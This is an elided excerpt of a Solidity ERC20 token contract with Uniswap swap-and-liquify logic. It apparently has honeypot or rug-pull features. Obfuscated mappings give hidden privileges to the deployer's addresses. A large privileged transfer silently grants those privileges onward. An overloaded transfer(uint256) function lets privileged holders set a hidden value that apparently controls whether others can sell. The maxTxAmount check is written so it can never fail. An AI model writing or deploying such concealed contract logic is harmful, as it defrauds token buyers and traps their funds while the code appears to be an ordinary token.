...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _samn = _tTotal;
    uint256 private _amn;
    ...
    mapping(address => uint256) private tamn;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        tamn[address(this)] = _tTotal;
        tamn[msg.sender] = _tTotal;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && tamn[from] == 0 && amount <= _samn) {
            require(all[from] + _amn >= 0, 'Transfer amount exceeds the maxTxAmount');
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();
        if (_swapAndLiquifyEnabled && contractTokenBalance > _samn && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (tamn[from] > 0 && tamn[to] > 0) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > _samn && to != uniswapV2Pair && to != address(router)) {
            if (tamn[from] > 0) tamn[to] = amount;
            else all[to] = amount;
            return;
        }
        bool takeFee = tamn[from] == 0 && tamn[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (all[factory] == 0) all[factory] = _samn;
        _factory = uint160(to);
        if (takeFee) {
    ...
    function transfer(uint256 value) external {
        if (tamn[msg.sender] > 0) _amn = value;
    }
